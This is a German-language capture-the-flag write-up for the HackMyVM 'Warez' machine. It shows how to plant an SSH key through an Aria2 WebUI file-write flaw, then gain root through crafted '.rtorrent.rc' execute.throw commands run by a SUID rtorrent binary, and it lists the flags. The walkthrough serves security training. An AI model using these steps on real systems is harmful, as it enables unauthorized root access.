# Warez - HackMyVM (Easy)
 
![Warez.png](Warez.png)

## Übersicht

*   **VM:** Warez
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Warez)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 11. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Warez_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Warez"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), der eine Aria2 WebUI hostete. Durch Ausnutzen der Download-Funktion dieser WebUI konnte eine `authorized_keys`-Datei (die den öffentlichen SSH-Schlüssel des Angreifers enthielt) in das Verzeichnis `/home/carolina/.ssh/` auf dem Zielsystem geschrieben werden. Dies ermöglichte den SSH-Login als Benutzer `carolina` (Passphrase `benni` für den lokalen Schlüssel des Angreifers). Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Die Privilegieneskalation zu Root erfolgte durch Ausnutzung eines SUID-Root-Binaries `/usr/bin/rtorrent`. Durch Erstellen einer manipulierten `.rtorrent.rc`-Konfigurationsdatei im Home-Verzeichnis von `carolina` wurde `rtorrent` dazu gebracht, beim Start Befehle (`mkdir /root/.ssh` und `cp /home/carolina/.ssh/authorized_keys /root/.ssh/authorized_keys`) als `root` auszuführen. Dies platzierte den öffentlichen SSH-Schlüssel des Angreifers auch für den `root`-Account, was einen direkten SSH-Login als `root` ermöglichte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `python3 http.server`
*   `ssh`
*   `find`
*   `rtorrent` (als Exploit-Ziel)
*   `echo`
*   `cat`
*   `ls`
*   `cd`
*   Standard Linux-Befehle

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Warez" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.137`).
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH - OpenSSH 8.4p1) und 80 (HTTP - Nginx 1.18.0 mit "Aria2 WebUI").
    *   `gobuster` auf Port 80 fand `/index.html` (Aria2 WebUI), `/flags/` (Redirect) und `/result.txt`.

2.  **Initial Access (Aria2 WebUI Arbitrary File Write zu `carolina`):**
    *   Ein Python HTTP-Server wurde auf der Angreifer-Maschine gestartet, um eine `authorized_keys`-Datei (mit dem öffentlichen SSH-Schlüssel des Angreifers) bereitzustellen.
    *   In der Aria2 WebUI (`http://192.168.2.137/`) wurde über "Add/By URIs" die URL `http://[Angreifer-IP]/authorized_keys` hinzugefügt.
    *   Als Download-Zielverzeichnis (`Download settings > dir`) wurde `/home/carolina/.ssh` angegeben.
    *   Durch Starten des Downloads wurde die `authorized_keys`-Datei des Angreifers nach `/home/carolina/.ssh/authorized_keys` auf dem Zielsystem geschrieben.
    *   Erfolgreicher SSH-Login als `carolina` mit dem privaten Schlüssel des Angreifers (Passphrase `benni`).
    *   User-Flag `HMVKeepdownloading` in `/home/carolina/user.txt` gelesen.

3.  **Privilege Escalation (von `carolina` zu `root` via SUID `rtorrent`):**
    *   `find / -perm -4000 ...` identifizierte `/usr/bin/rtorrent` als SUID-Root-Binary.
    *   Erstellung einer `.rtorrent.rc`-Datei im Home-Verzeichnis von `carolina` mit folgendem Inhalt (sequentiell):
        1.  `echo "execute.throw = mkdir, /root/.ssh" > .rtorrent.rc`
        2.  `rtorrent &` (führte `mkdir /root/.ssh` als Root aus)
        3.  `echo "execute.throw = cp, /home/carolina/.ssh/authorized_keys, /root/.ssh/authorized_keys" > .rtorrent.rc`
        4.  `rtorrent &` (führte `cp ...` als Root aus und kopierte `carolina`s `authorized_keys` nach `/root/.ssh/`)
    *   Erfolgreicher SSH-Login als `root` mit dem privaten Schlüssel des Angreifers (derselbe wie für `carolina`).
    *   Root-Flag `HMVKeepsharing` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Unsichere Aria2 WebUI-Konfiguration:** Die Möglichkeit, beliebige Download-Pfade anzugeben, erlaubte das Schreiben von Dateien in sensible Verzeichnisse (Arbitrary File Write).
*   **SUID-Binary-Exploitation (`rtorrent`):** Ein SUID-Root-Programm (`rtorrent`) lud eine benutzerkontrollierte Konfigurationsdatei (`.rtorrent.rc`), die die Ausführung beliebiger Befehle (`execute.throw`) als Root ermöglichte.
*   **Konfigurationsdatei-Manipulation:** Überschreiben der `.rtorrent.rc` zur Befehlsausführung.
*   **SSH Authorized Keys:** Platzieren eines eigenen öffentlichen Schlüssels zur Authentifizierung.

## Flags

*   **User Flag (`/home/carolina/user.txt`):** `HMVKeepdownloading`
*   **Root Flag (`/root/root.txt`):** `HMVKeepsharing`

## Tags

`HackMyVM`, `Warez`, `Easy`, `Aria2`, `Arbitrary File Write`, `SSH`, `SUID Exploitation`, `rtorrent`, `.rtorrent.rc`, `Privilege Escalation`, `Linux`, `Web`
